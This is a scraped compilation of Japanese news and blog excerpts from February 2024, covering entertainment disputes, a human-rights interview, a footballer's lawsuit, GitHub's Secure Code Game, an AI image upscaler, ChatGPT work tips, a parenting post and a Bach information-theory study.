Link: https://news.yahoo.co.jp/articles/5fea397ef8ff9e5311c7dd6daa96e7c15ad5e885
Content: 「俺をエアガンで撃った人だ」プラスマイナス岩橋『だれかtoなかい』出演者に“意味深投稿”で犯人探し勃発…「関係ない人にも被害が」と諫める声も

女性自身 2/19(月) 14:10
Title: 「ブラタモリ」はタモリによる若い女性への知識ひけらかし？SNS上の議論に元放送作家が異論（日刊スポーツ） - Yahoo!ニュース

Link: https://www.asahi.com/articles/ASS2J4VHVS26UPQJ008.html
Content: [PR]

人間が持つ基本的な権利であり、何人も侵害されることがあってはならない――。「人権」について誰もが尊重し、とくに若い世代は、格差やジェンダーなどの身近な問題も含めて関心が強いとされる。その一方で、ジャーナリストの安田浩一さんは最近、取材の現場で「人権」という言葉が敬遠されたり、怖がられたり、時にはからかいの対象にされている、と感じることが増えたという。（聞き手・中島鉄郎）

――在日コリアンやアイヌ民族などへの差別やヘイトの現場を取材されています。現状をどのように思われますか。

「差別で苦しむ人たちの実態をジャーナリストが報道するのは当たり前だし、思想信条に関係なく政治家は差別を許してはいけません。人権を守るというのは、基本中の基本なはずです。ところが最近、そうした記者や政治家を、何やら偏った考え方をする、一部の特殊な人たちであると、敬遠するような態度を感じることが増えました」

人が怒る姿は怖い

――「特殊な人たち」というのは？

「差別を受ける側の立場に立…
Title: 人権を「怖い」と敬遠する若者　ジャーナリスト安田浩一さんの危惧：朝日新聞デジタル

Link: https://www.sankei.com/article/20240219-WIBEOSLFEZJ7TABJGSNIICLQO4/
Content: サッカー・フランス１部リーグのスタッド・ランス所属の伊東純也選手（３０）が女性２人の同意なく性行為に及んだとして刑事告訴された問題で、伊東選手らは１９日、虚偽の告訴をされたとして女性２人に対し、約２億円の損害賠償を求める訴訟を大阪地裁に起こした。

伊東選手を巡っては、女性２人が昨年６月、一緒に飲食した後、大阪市のホテルで性被害を受けたと、週刊新潮のニュースサイト「デイリー新潮」が今年１月３１日に報じた。当時はアジア・カップ大会中で、伊東選手は日本代表を離脱した。

これに対し、伊東選手側は「全くの事実無根」として、虚偽告訴罪の告訴状を大阪府警に提出していた。

この日、伊東選手の代理人弁護士は女性の刑事告訴について「全くの虚偽。アジア・カップという大事な試合中になされており、極めて悪質」と主張。請求額の２億円はスポンサーの契約解除といった損害に基づいて算出しており、「今後、さらなる請求をすることも考えられる」としている。

性被害訴えの女性側「被害が真実と確信」
Title: 伊東純也選手、性被害訴えた女性2人に2億円損賠請求　大阪地裁に提訴「増額の可能性も」

Link: https://www.publickey1.jp/blog/24/githubsecure_code_game2.html
Content: GitHubは、脆弱性を含むコードを実際にデバッグすることでセキュアなコーディングを無料で学べる「Secure Code Game」のシーズン2開始を発表しました。

「Secure Code Game」は、ゲームと名付けられていますが、実際のコードを月間60時間無料で提供されるGitHub Codespacesの機能を駆使して修正し、ユニットテストを通して完成させる手順となっており、実践に近い内容となっています。

昨年（2023年）3月に開始されたシーズン1は、PythonとC言語でのセキュアなコーディングを学べる内容でした。今回のシーズン2ではこれらに加えてJavaScript、Go、そしてGitHub ActionsのYamlファイルなどが含まれており、これらのコードのバグを修正することになります。

Secure Code Gameの始め方

「Secure Code Game」の始め方は次の通りです。

まず「Secure Code Game」のGitHubのページに移動します。

下にスクロールしていくと「How to Start this course」の見出しの下に「Start course」ボタンがあるので、これをクリック（あるいは右クリックから新しいタブで開く）しましょう。

するとSecure Code Gameのリポジトリをテンプレートとして、自分のGitHubアカウントに新しいリポジトリを作成することになります。そのままパブリックリポジトリとして作成しましょう。

「skills-secure-code-game」が自分のリポジトリに作られます。シーズン1、シーズン2のフォルダがあるのが分かります。

「Season-2」のフォルダをクリックすると、Level-1からLevel-5まで5問のフォルダとREADME.mdファイルが用意されています。README.mdにはそれぞれの設問が書いてあります。

1つ前の自分のリポジトリ「skills-secure-code-game」画面に戻り、右上の緑の「＜＞ code」ボタンをクリックし、「Codespaces」タブの中の緑の「Create codespace on main」をクリックしましょう。

GitHubサーバ上で環境が構築された後に、Webブラウザ上でVSCode互換のGitHub Codespaceが起動します。 ここでもう一度、Seasn-2のREADME.mdを開いて問題の内容を把握し、バグを修正していきましょう。

GitHubは学習する上で、現在プレビュー版ではあるもののGitHub Copilotの拡張機能などの利用も推奨しています。
Title: GitHub、脆弱性のあるコードを実際にデバッグして学べる「Secure Code Game」シーズン2がスタート

Link: https://ascii.jp/elem/000/004/185/4185020/
Content: 画像の描き込みを増やして高画質にする、日本発の生成アップスケーラー「カクダイV1」が2月7日に発表されて話題になりました。東大出身ベンチャーのMavericksが開発したもので、画像生成AI「Stable Diffusion」生成環境「ComfyUI」向けの技術として無料公開されています。人気アップスケーラー「Maginific AI」を超える製品にまでに成長していくのか注目です。

Stable Diffusionのアップスケールは難しかった

カクダイを紹介する前に、まずは画像生成AIとアップスケーラーとの関係についてお話します。

Stable Diffusion登場後の画像生成AI技術を使ったアップスケーラーは、単に画像を拡大させるだけの用途ではなくなりました。画像を拡大するとき、プロンプトなどと組み合わせて、元画像になかったディティールを追加することで、元の画像にはなかった新しい魅力をつけることができるようになっています。

Stable Diffusionを使ったアップスケーラーとして最も一般的だったのは、生成環境「Stable Diffusion web UI A1111」の「Hires.fix（ハイレゾフィックス）」。これは、生成した画像にディティールを描き込みながら拡大するときは便利なのですが、1枚の画像を一気に大きなサイズへと再生成しようとするアプローチなので、弱点もありました。

なによりVRAMを必要とする仕組みなので、ビデオカードのVRAMが少ないとエラーが出やすく、作業が完了できないことが増えます。2023年3月頃は、NVIDIA GeForce RTX 4090（VRAM 24GB）搭載機でも4Kサイズの出力ができなくなってしまうほど重いアプローチでした。そして、品質も十分とまでは言えるものでもありませんでした。

その後、NVIDIAのドライバーなどの改善で出力自体はできるようにはなりましたが、いまだに動作が重い割には品質が足りないと感じられるアプローチであることには変わりません。

その後、VRAMの搭載量が少ないビデオカードでもアップスケールができる方法として登場してきたのが2023年5月の「Tiled Diffusion（タイルド・ディフュージョン）」でした。これは指定したサイズで、元の画像をタイルのように分割し、1枚ずつ順番にアップスケールしていくことで高画質化するもの。1枚の画像から、複数枚の画像を再生成して最後に1枚に統合するという仕組みのため、生成には時間がかかるものの、VRAMが少ないビデオカードでも動く上、美しくアップスケールができるということで、広く普及しました。

ただし、画像を分割して生成するため、パラメーターをうまく調整しないと、的確な画像が生成されません。分割された元画像とプロンプトを参照しながら画像を生成するのですが、「Denoising strength（ノイズ除去の強さ）」のパラメータを的確に設定しないと、期待通りの画像が出ないという弱点があります。これは元の画像からどれぐらい変化を許容するかというパラメータなのですが、デフォルトでは0.7になっており、生成時にはかなり画像が変わってしまいます。

たとえば、「girl」といったプロンプトが設定されていると、それぞれのタイルに女の子が生成されてしまうという結果になります（笑）。0.25あたりの低めの数値に設定して調整するのがよいとされています。

いまはTiled DiffusionがControlNetに対応したことで、ディティールアップ用の機能「Tile」と組み合わせるのが一般的になりました。元画像から大きく乖離することなく、ディティールを増やすことができます。

ただし、やはりモデルの選択とパラメーター設定の選択とには相性があり、思ったような画像を出すにはそれなりに試行錯誤とノウハウが必要です。
Title: 日本発の画像生成AIサービスがすごい　無料アップスケーラー「カクダイV1」 (1/4)

Link: https://meetscareer.tenshoku.mynavi.jp/entry/20240219-chatgpt
Content: 業務効率化に一役買ってくれると話題の「ChatGPT」。 業務効率化に一役買ってくれると話題の 今や「大学生の4人に1人が就活でChatGPTを使っている」といったデータもあり、リリース当初はあまり興味のなかった方でも、最近は「自分の仕事でうまく使えたりしないかな？」なんて考える機会も増えてきたのではないでしょうか？ ただ、ChatGPTが作業をどこまで効率化してくれるのかはまだまだ未知数です。時間を食う資料の作成やExcelの集計作業などをまるっとお任せできたらうれしいけど、思うようなアウトプットが得られず手間が増えたら、本末転倒な気もしますよね。 それに、ChatGPTの生成データをめぐっては、権利関係や内容の中立性・正確性などの側面で一部懸念の声も挙がっています。業務内での利用を禁止する企業や、自身のコンテンツを「学習・流用」されないよう自衛措置を講じるクリエイターも存在します。使用にあたってのルールも、完全に整っているとは言えないのが現状です。 そんないろいろと“手探り”の状況ではありますが、やはり無限の可能性を秘めたツール。今から使い方を学んでおいて損はないでしょう。 あぁ面倒な仕事、全部ChatGPTに投げられないものか……。 今回、そんなワガママに付き合ってくださったのは、『面倒なことはChatGPTにやらせよう』（講談社）という“ドンピシャ”な本を執筆された、からあげさんとカレーちゃんさん。 お二人に普段の仕事をChatGPTでどこまで効率化できるのか、それを踏まえて正しいアウトプットを得るためにはどうすればいいのか、ChatGPTを仕事に活かすコツをお聞きしました。



写真左：からあげさん。東京大学松尾研究室/株式会社松尾研究所に所属のデータサイエンティスト。『人気ブロガーからあげ先生のとにかく楽しいAI自作教室』『Jetson Nano超入門』を執筆。『ラズパイマガジン』『日経Linux』など多数の商業誌・Webメディアへも記事を寄稿。

写真右：カレーちゃんさん。AIエンジニア。『実践Data Scienceシリーズ PythonではじめるKaggleスタートブック』、『Kaggleのチュートリアル 第6版』を執筆。Kaggle Grandmaster。データ分析コンペティションをこよなく愛する。

※本文に写真掲載したChatGPTの回答は全て「GPT-4（有料版）」によるものです

達人たちは普段どんなことにChatGPTを使っている？

──おふたりは日常生活や仕事のどんな場面でChatGPTを使っているんですか？

からあげさん（以下、からあげ）：私の場合は日常的にブログを書いているので、いいタイトルが思い浮かばないときに提案してもらっています。

ChatGPTでできることは急激に増えてきています。私自身、データ分析をしたり、資料やメールの構成を作ったり、グラフを生成してもらったりと、いわゆる「面倒くさい仕事」をどんどんお任せしています。

カレーちゃんさん（以下、カレーちゃん）：僕は本業がAIエンジニアなので、プログラミングの際に分からないコードをよく教えてもらっています。あとは、音声から文字を起こしたり、文章の要約や翻訳をしたりと「素材を何かに変換する」作業や、資料作りのアイデア出しなどに付き合ってもらっていますね。

最近では、一緒に本を読むのにもハマっていて。

──一緒に本を読む？

カレーちゃんさん（以下、カレーちゃん）：スマホ版のChatGPTでは音声入力をすることができます。ChatGPTに「これから伝えることを覚えてほしい」と伝え、本の中で気になったところを読み上げて音声入力します。そうすると、本を読み終えた後、読み上げた箇所がChatGPTに入力された状態になっています。最後に、「入力したことをまとめてください」と伝えると、文章としてひとまとまりになるので、とても便利です。

あと、本を読んでいると難しい語彙や概念にぶつかることもあると思うのですが、そんな時に「小学生でも分かるように説明してください」「5行で説明してください」というように入力すると、本当に分かりやすく解説してくれますよ。

「『マルクス主義』について小学生でも分かるように説明してください」というプロンプトで生成された2パターンの回答

そこからさらに詳しく知りたい場合は、本やWebサイトなどで調べることもありますが、読書中はさらっと全体感をつかむだけでも十分だと思うので、読み進めるための前提知識をインプットするために活用しています。

ChatGPTで「パワポ資料」が速攻作れる

──ここからは仕事でChatGPTが具体的にどう役立つのか掘り下げていきたいのですが、今回はパワポ資料をChatGPTで作るデモンストレーションをやってくださるそうで……？

カレーちゃん：「からあげカレー」という商品のプレゼン資料を作るデモンストレーションをしてみます。

資料を作っていく前に、ChatGPTはアイデア出しが得意なので、そもそも「からあげカレー」というアイデアにたどり着くまでの過程もデザインしてくれるんです。

──というと……？

カレーちゃん：まずは、「カレーの新商品を考えています。若者向きで、たくさん食べたい人向けの新商品のアイデアをいくつか出してください」と入力してみましょう。

「グローバルフュージョンカレー」「エナジーカレー」など興味深いアイデアがいくつか出てきましたね。

さらに自分じゃとても思いつかないようなアイデアを引き出すために、「さらに、奇想天外なカレーのアイデアを出してください」と入力してみます。

──どれも興味を惹かれる……。

カレーちゃん：「カレー味のキャンディ」とか、「カレー風味のビール」とか、僕では思いつかないようなユニークなアイデアが出てきました。こうやって誰かと壁打ちをするようにアイデアを膨らませていけるところはChatGPTの大きな魅力です。

──たしかに。なんとなくアイデアの種はあるけれど、それがカタチにできない時、とても役立ちそうです。

カレーちゃん：さて、こんなふうにいろいろとアイデアが出て、最終的に「からあげカレー」を提案することで話がまとまったとします。

──ここからいよいよ資料作成のフェーズですね。

カレーちゃん：でも、プレゼン資料を作るにはまだまだ情報が不足していますね。そこで、アイデアに説得力を持たせるため「からあげカレー」のメリットとデメリットを整理してもらいましょう。

それっぽいメリット・デメリットが出てきましたね。

続いて、対象となるターゲットや販売時期、価格などを聞いて、提案に必要な情報をさらに補強していきます。

ここまで出たら、資料の土台は作れそうですよね。せっかくなので、資料の構成から考えてもらいましょう。

「以上の内容をもとに、からあげカレーを提案するプレゼンテーション資料を作成します。その内容を書いてください」と打ち込んでみます。

──あっさりとアウトラインが作れて驚きました。Q&Aコーナーまで。

カレーちゃん：もしいらないスライドがあれば、例えば「スライド10は必要ありません」などと入力してスライドの内容を調整することも可能です。

その上で、実際にPowerPointに書き出してもらいましょう。ここからはPythonというプログラミング言語を活用してpptxファイルをアウトプットします。

ChatGPTの裏側でPythonの処理を走らせるには、“Pythonを使って”と指示することが大事。すると、プログラミングモードに切り替わります。

「『スライド10』はカットし、以上の内容を、Pythonを使ってスライドに書き出してください」と入力してみます。

ダウンロードリンクが生成されて……

パワポ資料のファイルがダウンロードできた

──すごい……。あっという間にパワポ資料が出来た……！

ChatGPTでExcelのグラフを作ってみよう

──ChatGPTを使いこなせば、資料作成の手間が大きく省けることが分かりました。ちなみに、パワポ資料の作成以外もお任せできるんでしょうか？ 例えば、Excelのグラフ作成とか……。

からあげ：Excelの機能でもできますが、ChatGPTでグラフ化することも可能です。よく資料で見るExcelのグラフを作ってみましょうか。

使うデータは、我が家の家計簿の一部です。これをChatGPTにドラッグ&ドロップします。

支出日とカテゴリ、支出額が書かれた家計簿データ

その上で、「アップロードしたExcelファイルの金額を月ごとに集計して棒グラフにしてください」と入力すると……。

──これが欲しかった！ というグラフがすぐ生成されましたね。

からあげ：カテゴリごとの集計をグラフ化したい場合は「カテゴリごとの金額を円グラフにしてください」と入力します。

──恐れ入りました。これまで一生懸命覚えたExcelの機能は一体……。

からあげ：たしかに、アウトプットしたいものや指示内容さえ言語化できていれば、もうExcelの機能を細かく覚える必要はないかもしれませんね。

ここではグラフを紹介しましたが、マインドマップなども作成可能ですし、逆に数値を並べたテキストデータをExcelファイルに落とし込むこともできます。

──ちなみに、ChatGPTを使ってExcelに詳しくなることもできるのでしょうか？

からあげ：できそうです。例えば、検索エンジンで関数を調べる時はキーワードに迷ってしまいがちですが、ChatGPTでは「こんなことをしたいけど、どういうExcelの関数が必要ですか？」と聞けばすぐに教えてくれるので便利ですよ。

ChatGPTと検索エンジンを使い分けて「調べもの」を極めよう

──さて、これまで何かを作成してもらうタスクについて紹介してきましたが、ChatGPTの得意分野といえば「調べもの」ですよね。そもそも、ChatGPTとGoogleのような検索エンジンでの調べものにはどのような違いがあるんですか？

からあげ：おおまかに、ChatGPTは「どうやって検索したらいいか分からないことを調べるツール」で、検索エンジンは「調べたいことが言語化できている事柄について調べるツール」という区分けができると思います。

検索エンジンだと、的確なキーワードで検索しなければ、求める検索結果にたどり着けないことも少なくありませんが、その点ChatGPTは曖昧な聞き方でも答えを出してくれます。「うまく言語化できないモヤモヤ・悩み」にも何かしらの答えを出してくれるんじゃないかな。ChatGPTでの調べものは「他人に相談する」ニュアンスに近いような気がします。

──なるほど。例えば、「魚のさばき方」を調べたい時はどう調べればいいんでしょう？

カレーちゃん：調べたいことが「さばき方」と具体的なので、検索エンジンに聞いたほうが求める答えを効率的に引き出せるでしょうね。

でも、「この魚をおいしく食べたい、でもその食べ方が分からない」くらいの粒度であれば、ChatGPTに聞いたほうが料理のアイデアも得られて前進しそうです。

例えばそこで、アジフライという料理のアイデアが出たとして、それが作りたい、となった時、初めて検索エンジンに「アジフライ 作り方」と入力する。すると、料理のアイデアから作り方まで一気に調べられるわけですよね。

まずはChatGPTに「アジのおいしい食べ方」を聞いてみる

次に「アジのフライ」の「作り方」を検索してみる

こうして、調べたいものによって検索ツールを使い分けたり、組み合わせたりする力は、AIが調べものを主導する時代に求められるスキルかもしれません。

───そこがうまく使い分けられていないとどうなるのでしょう？

カレーちゃん：ChatGPTに具体的な検索ワードを入力しても、結局Webブラウジング（2024年2月現在はBing）をした検索結果を共有してくれるだけなので、ChatGPTを使うメリットがあまり感じられないと思います。

───たしかに。そのためにも今自分がどんな調べものをしたいのか、把握しておくのが必要ですね。ちなみに、ChatGPTならではの検索テクニックというのは他にもあるんでしょうか？

カレーちゃん：手持ちのファイルをアップロードして自分だけの検索エンジンが作れることも魅力のひとつですね。

例えばPDFやWordといった文章ファイルの中から何かの手続き方法を検索したい時、通常ならファイル中の言葉と一言一句正しくキーワードを入力しないとヒットしませんが、ChatGPTならたとえ表現が違ってもこちらが求める情報を的確に拾ってきてくれることが多いです。

さらに「このケースの場合は当てはまるのか」「費用はどうなるのか」など、ファイルに記載されている内容について質問することもできます。

───そんなことまで！ 便利ですね。

カレーちゃん：すべてをChatGPTで完結させずとも、検索エンジンやSNSなどと組み合わせることで検索力が養えそうです。

ChatGPTを使いこなせば「お願い力」がつく

───ふと気になったのですが、ChatGPTを調べものやアイデア出しに使うことで、他の人とアウトプットの内容がかぶってしまったり、オリジナリティが損なわれたりするようなことはあるのでしょうか？

カレーちゃん：ChatGPTが導き出す答えには似通ったものもありますが、完全に一致することはほぼありません。それに、500個でも1000個でもアイデアを出してくれるので、むしろ何を選び取っていくかでオリジナリティが発揮される気がしますね。

からあげ：アイデアまでは出してもらえても、なんらかのカタチにするにはやはり人力で整えていくことになるので、自分なりの味をプラスアルファできると差別化になりそうです。

だからこそ、今後はChatGPTを使いこなせる人と使いこなせない人の差がどんどん大きくなっていくでしょうね。

───実際にChatGPTをうまく使いこなすためにはどうすればいいですか？

からあげ：自分がやりたいことを試してみるのが一番の近道です。たとえば、やりたいけど時間がなくてできていなかったことや、やらなくちゃいけないけど面倒臭いと思っているようなこと、そしてある程度マニュアル化できそうなものなど。

実際に触って試行錯誤してみると、これはできる／できないというのを身を以て知ることができると思います。自力でできそうだと思うものでも、あえてChatGPTにやらせてみることで可能性が広がるはずです。

カレーちゃん：ChatGPTは、自分たちのやりたいことをサポートしてくれる強力な味方だと考えてみるといいと思います。

たとえば、上司や友人を1日中質問攻めにしたら怒っちゃうけど、ChatGPTはいくら質問しても怒らない。学びを深めてくれる自分専属の家庭教師のようなものですよね。

すべてを任せるというよりも、自分のやりたいことを実現するためのサポーターや良きアドバイザーとして活用できるといいと思います。

そして、人に聞いたり、お願いしたりするようにChatGPTを活用するということなので、当然ながら「他人にこれを聞いたり、お願いしたりしちゃマズいかどうか」という視点を忘れてはいけないと思います。

生成AIをめぐる法整備が進む中、今後もルールや基準が変わっていく可能性も高いのですが、少なくとも社外秘の資料をアップロードしない、他人の著作権をおかさない、といった配慮は必要ですよね。

───新しい技術だからこそ、モラルも守ること、アウトプットしたものは本当に正しいか自分の目で確認することも必要となってきそうですよね。ちなみに、ここまで聞こう、聞こうと思えて聞けてなかったのですが、求めるアウトプットにたどり着くためのプロンプトの書き方のコツってあるのでしょうか？

カレーちゃん：「できるだけ具体的に指示する」「指示の内容は一つずつに分ける」「例を挙げる」などですね。それでも、うまくいかないこともあると思ってください。同じプロンプトを入力しても違う結果がアウトプットされるんですよね。

───なんだか人間にお願いする時のような……。

からあげ：ChatGPTを使っていると、普段自分がいかに雑なお願いごとをしているかに気付かされると思います。

AIが人間の仕事を奪う、みたいな論調もありますが、ChatGPTを使いこなせるようになったら、むしろ「お願い力」は上がるかもしれませんね（笑）。AIと対戦することでレベルがどんどん上がっている棋士のように。

取材・文：いしかわゆき

写真：関口佳代

編集：はてな編集部

制作：マイナビ転職
Title: 仕事で差をつけるChatGPT活用術。初心者でも使えるスゴいテクニックを達人に聞く - ミーツキャリアbyマイナビ転職

Link: https://togetter.com/li/2317032
Content: 目次 たしかに

これが日本らしい

これが日本の悪いところ

クレーマー対策

みんなの反応 たしかに

これが日本らしい
Title: 台湾の友人いわく「この掲示の初めと最後はいらない」→ 99999999999人はそれでいいと思ってるけどたった1人の気の狂ったクレーマーがキレて暴れる

Link: https://www.nikkansports.com/entertainment/news/202402190000253.html
Content: 元放送作家の長谷川良品氏が19日までに自身のX（旧ツイッター）を更新。NHKの人気旅番組「ブラタモリ」の内容をめぐる議論を受け、「高齢男性が若い女性に蘊蓄（うんちく）を垂れる構図」との否定的な意見に異を唱えた。

同番組のレギュラー放送が本年度をもって終了することが発表され、SNS上では番組ファンから惜しむ声が続々とあがった。そうした中、文化人類学者で愛知県立大学の亀井伸孝教授が自身のXで「内容はよい企画だったと思いますが、『高齢男性が若い女性に蘊蓄を垂れる』という『マンスプレイニング』の構図だけは、ずっと気になり続けていました。次は、女性が男性にこんこんと説教する番組をやったらいいと思います。それでバランスが取れます」と私見を述べ、さまざまな意見が寄せられていた。

この投稿に長谷川氏は「知識をひけらかすも何も、そもそもこの番組の骨子は『タモリvs番組』－いわばタモリさんへの挑戦状です。地形マニアであるタモリさんに難問を出題しているに過ぎません。そしてポツリと正解したら専門家がフォロー。むしろ『教えるスタイル』を避けようとする稀な番組」と説明。タモリについて「『笑い』という過去の遺産で食いつながない。唯一の存在ですね」と私見を述べ、若者への見識のひけらかしについても「むしろ極端なほど嫌います」とした。

長谷川氏は元放送作家で、長谷川大雲としてテレビ朝日「いきなり黄金伝説」「SmaSTATION!!」「ナニコレ珍百景」などを手がけてきた。
Title: 「ブラタモリ」はタモリによる若い女性への知識ひけらかし？SNS上の議論に元放送作家が異論 - 芸能 : 日刊スポーツ

Link: https://anond.hatelabo.jp/20240219134030
Content: ５歳半の男の子、これまで子育てで苦労したことが無かった

楽しい思い出しか無い。

どうせ母親に任せっきりなんだろう？

８割は俺が担った自負がある。

オシメ交換は９割俺がやった

土日の終日９５％俺が面倒見てる。

幼稚園の迎え（送りはママ）や公園遊びの９９％は俺

家の中でも子供の相手は俺、

離乳食はほぼ和光堂とキューピに頼ったが粥くらいは作った

米をごま油で炒めチキンスープで煮込む、わりと手間がかかる

まぁ俺が好きだから作っただけで８割が俺が消費していたが、まぁ作った

子どもたちが集う公園には精神ギリ暴発寸前のヤツれた母親を大勢見かける、ブチギレシーンを何度も目撃した

ウチ一度もねぇのよ

そりゃもちろんダダをこねることもあるがせいぜい３歳まで、ほぼ記憶が無い

公園から帰りたくないとか玩具買って、地面に転がって手足バタバタは１度あったが、我が子にもとうとうこの時期が来たかと嬉しくなりビデオ撮影した。

アングルが悪いからもう一度やってくれと頼んだら断られた。

その後、次こそ最高の映像を残してやると待ち構えていたがついぞやらずに４歳、５歳を経過。

もうやらんだろう

イヤイヤ期も無かった、健全な成長に必要な時期だと本に書いてあったのでイヤイヤ期をやれと命じたことがあるが、拒否られた

泣きじゃくる、癇癪を起こすことも稀にあったが、数えるほどしか覚えてない

人間含めた哺乳類は抱きしめて胸の圧迫と皮膚刺激を与えると落ち着く。リッキンギ、グルーミング。

海馬の糖質コルチコイド受容体、視床下部からの副腎皮膚刺激ホルモン分泌に対するネガティブフィードバック機構に作用する、しろ、さぁ交感神経活動の正常化、カテコールアミンの分泌を抑制せよ、とか考えながら３０秒も抱きしめていれば落ち着く、チョロイ。

その後はタイムアウト、我が家では反省タイムと呼んでいる

これも４，５回しかやった記憶が無い

押さえつけてるだけだろ？

好き放題させている

公園で遊びたい、帰りたくない、真っ暗の砂場で飽きるまで待ってやったのは１０回２０回では無い

面倒な説得やら交渉やら説諭するくらいなら俺は俺でスマホでネットでもやってりゃいい。

目を離した隙に砂を食ってたりしたこともあったが、腸内フローラの多様性、幼年病原体とのエンカウントはむしろ有益であるとの論文もある、どんどん食え。

タブレットやスマホも専用機を与え自由に使わせており、一応は制限時間を儲けているが時間でロックかかると

「パパ延長して」で延長してしまうので形骸化している

目が悪くなるかもしれんが、なぁに彼が大きくなることにはips細胞とかでちゃちゃっと直せるようになるのではなかろうか、しらんけど。メガネかけりゃいい。

玩具買ってくれ、買いますとも、せいぜい数百円、数千円、数万円のものだ

一時期Nゲージにはまったときは焦ったが

ウチは貧乏だから、との説得をそれとなくしたらあまり無茶は言わなくなった、値札を見て「これならどう？」みたいな、挙げ句に「ウチは貧乏だから我慢する、お金持ちになったら買ってね、っていうか俺が自分で買うわ」とか言い出した

念のため、悲壮感はゼロだからね、子供は笑いながら冗談半分に言うてる。

なんというか、部屋にゴミ増えるのうぜぇっ等々大人の諸事情的なこともざっくり包括的に理解してくれてる感じ、天使か、

出かける時は服も着させる、自分でやらない、パパやって

無理にやらせようとしても遊んでいるだけで逆に面倒くさい、ならばさっさと俺が着せたほうが早い

まさか１０歳二十歳になって、パパ靴下捌かせととは言わんだろ、そのうち勝手に自分でやりだす。

というか幼稚園では全部自分でやってるのだ。

甘えてるだけ

甘えが悪いとは思わん、５歳なんて「生きるの楽しい」って記憶だけ刷り込めば十分だと思ってる。

「今日は運が良かったね、楽しかったね」子供の口癖、俺がよく言ってやるのを真似た。

なにか少しでも楽しいことや新しいものに出会えたらそうやってフラグを打つ、記憶する

そうそう、そう言えばトイトレも楽だった。

幼稚園に入る前に終わらせなければと少々焦ったが、入園数週間前に秒で終わった

おねしょは１度だけだった。ちょろい

だがいまだにトイレに付き合わされてチンコを持たされる

幼稚園では自分でできるのに家では俺を呼ぶ

はいはいやりますとも、持ちますよ

まさか３０歳４０歳にもなって以下略

先日、公園で遊ばせていると「パパ来て」、公園では勝手に遊ばせる、

友達がいれば友達と遊んでいるし、誰も居なければ適当に同年の子供を見つけて友達になって遊んでる。楽でいい。なんか知らんが走り回ってる、何が楽しいのかねぇ

そんな息子が満面の笑顔で「雲梯最後まで行けた見てくれ」と、アレをしろこれをしろという指導や誘導は一切しないが勝手に雲梯の練習を初めて、しばらく２，３ステップまでしか進めなかったがようやく最後まで渡り切れたようだ。

雲梯で脳が活性し利口になることは知っている、頑張ってやってくれ

ご披露、行けた、凄い凄い、拍手はしてやった

自転車は４歳でストライダーを足蹴りからペダルに変えた

補助輪をつけるのが面倒くさかったのでそのままやらせていたら小一時間で習得。

ビュンビュンと走り始めた、とにかく楽で良い

公文だのピアノ、絵画、水泳、皆さんいろいろされているが一切無し

風呂場にスピーカーをつけて好きな音楽を流せるようにしているが、元気に鬼滅とポケモンを歌っている。そんなんでいいんちゃうの？一応俺はピアノが弾けるが

先日、図書館で３歳まで公園でよく一緒に遊んでいた母子と再会した

突然来なくなったのだが習い事全部入りなのは知っていた、育児マニュアル信奉親、公園では裸足で遊ばせてた

その子を見て、正直勝ったと思った、いや勝ち負けとか言うちゃダメなのは百も承知、二百も合点なんだが、感じてしまったものはしょうがない

彼は生命力と覇気がスポイルされた目をしていた、可哀想に、だがそれも親の愛だ

アホだと思うが。どうにもできん。頑張れ

スポーツクラブに通う彼の筋力、体幹は明らかに俺の息子に劣っている、事実だから仕方がない

俺の息子はひらがなを一つも書けないが、彼はカタカナも書けるだろう

なぁに文字なんて小学生になってから嫌でも習う、６０にもなってひらがなが書けない以下略

就学してから、こんなの全部やってるもーん、よゆー、から教育が始まるのと

え？俺全然できない、みんなできるの？ヤベ、勉強頑張らないと不味くね？

からスタートしたほうが良いと思ってる

息子は超絶負けず嫌い、そこで折れない諦めないフォローと自尊心や自己肯定感を養ってやれば良い

俺だって一応子供を育てるにあたってマニュアルも参照した

スポック博士の育児書の初版本を図書館で書庫請求して取り寄せてもらった（平成元年の三版しか残ってなかった）

つまり、まー、こんな知見はどれほどの支持、権威や科学やデータだと言うても、ほらみてみ、変わるのよ、間違えてるのよ

というのを我が目で再確認しておきたかったからだ

ようするにマニュアル本を否定するために読んだ

だがあの本はぶっちゃけ役に立った、「いろいろ書くが、子供なんて頑丈だから簡単には死なない、自信持って自分のやり方で育てなさい」だってさ

そのまんまやんけｗ

とにかく、子育ては楽しい

ツイートシェア
Title: 子育てがチョロすぎるｗｗ

Link: https://www.itmedia.co.jp/news/articles/2402/19/news042.html
Content: ペンシルベニア大学などに所属する研究者らが発表した論文「Information content of note transitions in the music of J. S. Bach」は、音楽作品を情報ネットワークへと変換し、作品が内包する情報量と伝達効率を調査した研究報告である。この研究では、バッハの楽曲を情報ネットワークとしてモデル化し、楽曲が持つ情報量とその情報をいかに効率よく伝達するかを定量的に評価する。

提案手法で音楽作品から構築されたネットワークの例

手法の第一歩として、楽曲の各音符をネットワーク上のノードとして捉え、音符間の遷移をエッジで結び付けている。このエッジは指向性を有し、一つの音符から次の音符への遷移を示す。さらに、エッジには重みが付与され、これは楽曲内での特定の音符遷移の発生頻度を示している。ネットワークをこのように構築することで、楽曲の構造を数学的に表現できる。

各楽曲のネットワークから、情報理論に基づいて「シャノンエントロピー」という指標を用いて情報量を計算している。シャノンエントロピーは、ネットワークが持つ情報量を定量化するものであり、エントロピーが高ければ楽曲が豊富な情報を含むと解釈できる。この指標を用いて、異なる楽曲形式を情報内容の観点から比較・分析している。

結果、教会などのより瞑想的な環境のために作曲された賛美歌「コラール」は、予測可能性が高く情報量が少ないため、エントロピーが低いことを示した。一方で、鍵盤楽器による楽曲「トッカータ」や「プレリュード（前奏曲）」などの聴衆を楽しませ驚かせることを目的とした作品は、複雑でエントロピーが高く情報量が多いことを示した。

提案手法で音楽作品から構築したネットワークの例 バッハの曲を提案手法でネットワーク化した図 （a）コラール、（b）フーガ、（c）プレリュード、（d）トッカータ

さらに、研究チームは、人間の知覚プロセスを模倣したコンピュータモデルを用いて、聴取者が曲を聴いて情報のネットワークをどのように推測するかを調査。そして、実際の楽曲のネットワークと聴取者が推測するネットワークとの間の不一致を評価した。

提案手法で音楽作品から構築したネットワークの例 人間が情報ネットワークをどのように処理するかについてを表した図

その結果、バッハの楽曲で得られたネットワークと、推測したネットワークとの間の不一致が、ランダムに生成したネットワークよりも小さいことを発見した。

これはバッハの楽曲が聴取者の知覚システムにとって処理しやすく、音楽の流れや構造を追いやすいことを示し、つまり情報を効果的に伝達するための構造的特徴を持っていることを示唆している。

